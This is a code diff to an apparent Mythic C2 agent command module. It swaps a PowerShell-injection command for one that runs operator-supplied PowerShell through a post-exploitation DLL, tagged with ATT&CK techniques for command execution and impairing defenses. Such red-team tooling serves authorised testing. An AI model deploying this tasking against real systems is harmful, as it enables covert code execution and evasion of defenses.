@@ -3,7 +3,7 @@ import json
 from .utils.bof_utilities import *
 from .utils.mythicrpc_utilities import *
 
-class PowerpickArguments(TaskArguments):
+class PowerchellArguments(TaskArguments):
 
     def __init__(self, command_line, **kwargs):
         super().__init__(command_line, **kwargs)
@@ -21,7 +21,7 @@ class PowerpickArguments(TaskArguments):
         if len(self.command_line) == 0:
             raise Exception(
                 "Require a PowerShell command to execute.\n\tUsage: {}".format(
-                    PowerpickCommand.help_cmd
+                    PowerchellCommand.help_cmd
                 )
             )
         if self.command_line[0] == "{":
@@ -30,16 +30,20 @@ class PowerpickArguments(TaskArguments):
             parts = self.command_line.split(" ", maxsplit=1)
             self.add_arg("powershell_params", parts[1])
 
-class PowerpickCommand(CoffCommandBase):
-    cmd = "powerpick"
+class PowerchellCommand(CoffCommandBase):
+    cmd = "powerchell"
     needs_admin = False
-    help_cmd = "powerpick -Command [command]"
-    description = "Inject PowerShell loader assembly into a sacrificial process and execute [command]."
+    help_cmd = "powerchell -Command [command]"
+    description = "Execute PowerShell script using PowerChell post-ex DLL."
     version = 1
     script_only = True
     author = "@c0rnbread"
-    argument_class = PowerpickArguments
+    argument_class = PowerchellArguments
     attackmapping = ["T1059", "T1562"]
+    attributes = CommandAttributes(
+        dependencies=["execute_dll"],
+        alias=True
+    )
 
     async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
         response = PTTaskCreateTaskingMessageResponse(
@@ -51,22 +55,22 @@ class PowerpickCommand(CoffCommandBase):
         response.DisplayParams = "{}".format(taskData.args.get_arg("powershell_params"))
 
         # Upload desired module if it hasn't been before (per payload uuid)
-        file_name = "powerpick.x64.exe"
+        file_name = "powerchell.x64.dll"
         succeeded = await upload_module_if_missing(file_name=file_name, taskData=taskData)
         if not succeeded:
             response.Success = False
             response.Error = f"Failed to upload or check module \"{file_name}\"."
 
 
-        # Execute PowerPick
+        # Execute PowerChell
         subtask = await SendMythicRPCTaskCreateSubtask(
             MythicRPCTaskCreateSubtaskMessage(
                 taskData.Task.ID,
-                CommandName="execute_assembly",
+                CommandName="execute_dll",
                 SubtaskCallbackFunction="coff_completion_callback",
                 Params=json.dumps({
-                    "assembly_name": file_name,
-                    "assembly_arguments": taskData.args.get_arg("powershell_params")
+                    "dll_name": file_name,
+                    "dll_arguments": taskData.args.get_arg("powershell_params")
                 }),
                 Token=taskData.Task.TokenID,
             )
